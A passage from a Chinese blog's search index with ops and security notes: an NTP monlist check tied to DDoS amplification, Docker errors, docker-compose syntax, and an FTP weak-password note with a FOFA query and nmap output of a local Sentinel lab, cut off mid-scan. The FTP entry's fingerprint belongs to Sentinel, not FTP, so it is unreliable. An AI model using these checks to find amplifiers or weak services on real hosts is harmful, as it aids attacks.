</span>   1d0     <span class="hljs-number"> 1 </span>      2<br>120.25.115.20           <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 8 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      3<br>100.100.61.88           <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 9 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      6<br>time5.aliyun.com        <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 1 </span>4<span class="hljs-number"> 4 </span>   5d0     <span class="hljs-number"> 0 </span>     24<br>time4.aliyun.com        <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 1 </span>4<span class="hljs-number"> 4 </span>   5d0     <span class="hljs-number"> 0 </span>     25<br>ntpdc&gt;<br></code></pre></td></tr></table></figure><p>如果存在查询记录，则表示支持monlist</p><p>如果存在“Server reports data not found”，则表示不支持monlist</p><h4 id="yum-安装"><a href="#yum-安装" class="headerlink" title="yum 安装"></a>yum 安装</h4><p>yum install ntp -y</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置ntp服务器</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="探测UDP123端口"><a href="#探测UDP123端口" class="headerlink" title="探测UDP123端口"></a>探测UDP123端口</h4><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] 【漏洞分析】DDOS攻防分析（三）——UDP篇  XuepengZ 2021-09-02 14:50<br>链接：<a href="https://www.cnblogs.com/Shepherdzhao/p/15218716.html">https://www.cnblogs.com/Shepherdzhao/p/15218716.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
      <tag>udpflood</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_error</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_error/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker-pull-error"><a href="#docker-pull-error" class="headerlink" title="docker pull error"></a>docker pull error</h1><h2 id="image-name-error"><a href="#image-name-error" class="headerlink" title="image name error"></a>image name error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab-ce/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: pull access denied for gitlab-ce/gitlab-ce, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>因为镜像名称写错导致报错，正确镜像名称gitlab&#x2F;gitlab-ce</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker search gitlab-ce</span><br><span class="hljs-title class_">NAME</span>                                     <span class="hljs-title class_">DESCRIPTION</span>                                     <span class="hljs-title class_">STARS</span>     <span class="hljs-title class_">OFFICIAL</span>   <span class="hljs-title class_">AUTOMATED</span><br>gitlab/gitlab-ce                         <span class="hljs-title class_">GitLab</span> <span class="hljs-title class_">Community</span> <span class="hljs-title class_">Edition</span> docker image based …   <span class="hljs-number">3592</span>                 [<span class="hljs-title class_">OK</span>]<br><br></code></pre></td></tr></table></figure><h2 id="image-tag-error"><a href="#image-tag-error" class="headerlink" title="image tag error"></a>image tag error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: manifest for gitlab/gitlab-ce:14.9.1 not found: manifest unknown: manifest unknown<br><br></code></pre></td></tr></table></figure><p>因为镜像版本号不对导致报错，需要正确版本号</p><p>如何确认正常版本号</p><p>登录docker hub <a href="https://hub.docker.com/u/library">https://hub.docker.com/u/library</a> 搜索对应的镜像</p><p>复制提供的命令即可正确下载</p><p><a href="https://blog.csdn.net/ichen820/article/details/114536044">https://blog.csdn.net/ichen820/article/details/114536044</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_compose</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_compose/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_compose/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>项目（project）由一组关联的应用容器组成一个完整业务单元</p><p>服务（service）一个应用容器</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>指定yml基于的docker-compose版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span>: &#x27;<span class="hljs-number">2</span>.<span class="hljs-number">3</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">services</span>:<br>  <span class="hljs-attribute">redis</span>:<br>    <span class="hljs-attribute">image</span>: redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>-alpine<br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>指定容器运行的镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">image</span>: redis<br><span class="hljs-attribute">image</span>: ubuntu:<span class="hljs-number">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">image</span>: example-registry.com:<span class="hljs-number">4000</span>/postgresql<br><span class="hljs-attribute">image</span>: a4bc65fd # 镜像id<br><span class="hljs-attribute">image</span>: vulhub/airflow:<span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>添加环境变量，值可以为数组、字典或布尔值，布尔值需要使用引号，否则YML解析器转换为 True 或 False</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:12-alpine</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker docker-compose <span class="hljs-keyword">up</span> <br>Creating network <span class="hljs-string">&quot;docker_default&quot;</span> with the default driver<br>Pulling pgsql (postgre<span class="hljs-variable">s:12</span>-alpine)...<br><span class="hljs-number">12</span>-alpine: Pulling from library/postgres<br><span class="hljs-number">9</span>b18e9b68314: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">75</span>aada9edfc5: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">820773693750</span>: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">83</span>dc43929537: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">92</span>e2c19af124: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">52</span>f242e5c209: Pull <span class="hljs-built_in">complete</span><br>e0a8c8565c42: Pull <span class="hljs-built_in">complete</span><br>a424ab832487: Pull <span class="hljs-built_in">complete</span><br>Digest: <span class="hljs-built_in">sha256</span>:<span class="hljs-number">55</span>fb7ba926381c2ac1f8f58bb181dd932f140aa467c3097a07c6815648dbc5e2<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> postgre<span class="hljs-variable">s:12</span>-alpine<br>Creating docker_pgsql_1 ... done<br>Attaching <span class="hljs-keyword">to</span> docker_pgsql_1<br><br>➜  ~ docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES<br><span class="hljs-number">34264</span>c6a3d67   postgre<span class="hljs-variable">s:12</span>-alpine   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">55</span> seconds ago   Up <span class="hljs-number">54</span> seconds   <span class="hljs-number">5432</span>/tcp   docker_pgsql_1<br><br></code></pre></td></tr></table></figure><h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h3><p>设置依赖关系</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><p>docker-compose up：按照依赖关系启动服务，例如：先启动db和redis，再启动web，但是并不是说必须等db和redis启动完成再启动web</p><p>docker-compose up SERVICE：自动包含指定SERVER的依赖项</p><p>docker-compose stop ：按照依赖关系停止服务</p><h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">gitlab</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/gitlab:13.10.1</span><br>  <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">postgresql</span><br>  <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10022:22&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;443&quot;</span><br></code></pre></td></tr></table></figure><p>绑定容器的8080到主机的80</p><p>绑定容器的443到主机的任意端口，取决于容器启动时的随机端口</p><h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:11.9-alpine</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=gitlabhq_production</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">DB_EXTENSION=pg_trgm</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh</span><br></code></pre></td></tr></table></figure><p>主机文件或数据卷挂载到容器中</p><h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">namenode</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/hadoop:2.8.1</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">CLUSTER_NAME=vulhub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_replication=1</span><br>  <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/namenode.sh</span><br></code></pre></td></tr></table></figure><p>覆盖容器启动的默认命令</p><h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">healthcheck:</span><br><span class="hljs-symbol">  test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;pg_isready&quot;</span>, <span class="hljs-string">&quot;-U&quot;</span>, <span class="hljs-string">&quot;airflow&quot;</span>] <span class="hljs-meta">#设置检查程序</span><br><span class="hljs-symbol">  interval:</span> <span class="hljs-number">1</span>m5s <span class="hljs-meta">#设置检测间隔</span><br><span class="hljs-symbol">  retries:</span> <span class="hljs-number">5</span> <span class="hljs-meta">#设置重试次数</span><br><span class="hljs-symbol">  timeout:</span> <span class="hljs-number">10</span> <span class="hljs-meta">#设置超时时间</span><br><span class="hljs-symbol">  start_period:</span> <span class="hljs-number">1</span>m40s <span class="hljs-meta">#设置程序启动多久后开始检测</span><br></code></pre></td></tr></table></figure><h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h3><p>指定容器名称，而非默认生成的名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">container_name: <span class="hljs-keyword">my</span>-container<br></code></pre></td></tr></table></figure><h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h3><p>指定设备映射列表</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">devices:</span> <br>    - <span class="hljs-string">&quot;/dev/ttyUSB0:/dev/ttyUSB0&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>自定义DNS服务器，可以为单个值，也可以为列表</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dns</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8.8.8.8</span><br><br><span class="hljs-attribute">dns</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114</span><br></code></pre></td></tr></table></figure><h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h3><p>自定义DNS搜索域，可以为单个值，也可以为列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns_search: ns1<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br><br>dns_search: <br>    - ns2<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br>    - ns3<span class="hljs-selector-class">.test</span>.com<br></code></pre></td></tr></table></figure><h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h3><p>从文件中添加环境变量</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.env</span><br><br><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">envfile2.env</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./envfile3.env</span><br><br></code></pre></td></tr></table></figure><h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h3><p>暴露端口，但不映射到宿主机，也就是说只有内部可使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">expose:</span> <br>    - <span class="hljs-string">&quot;3333&quot;</span><br>    - <span class="hljs-string">&quot;6666&quot;</span><br></code></pre></td></tr></table></figure><h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a>extra_hosts</h3><p>添加主机名映射，在容器&#x2F;etc&#x2F;hosts中创建主机名和IP绑定关系</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">extra_hosts:</span> <br>     - <span class="hljs-string">&quot;newhost:1.1.1.1&quot;</span><br>     - <span class="hljs-string">&quot;oldhost:2.2.2.2&quot;</span><br></code></pre></td></tr></table></figure><h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><p>服务日志记录配置</p><p>di r</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>指定镜像构建上下文路径</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotop</title>
    <link href="/2024/03/04/yunwei/commands/iotop/"/>
    <url>/2024/03/04/yunwei/commands/iotop/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ftp_weak_password</title>
    <link href="/2024/03/04/security/secvulns/ftp/ftp_weak_password/"/>
    <url>/2024/03/04/security/secvulns/ftp/ftp_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><p>ftp弱口令</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>ftp服务存在弱口令</p><h3 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p>高危</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、禁止将ftp&#x2F;sftp服务暴露在公网</p><p>2、设置强口令，包含数字、大小写字母、特殊字符，长度10位以上</p><p>3、设置访问来源IP限制</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h4><p>默认端口 21（TCP）</p><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><p>title：Sentinel Dashboard</p><h4 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h4><h5 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h5><p>“title: Sentinel Dashboard”</p><h5 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h5><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span 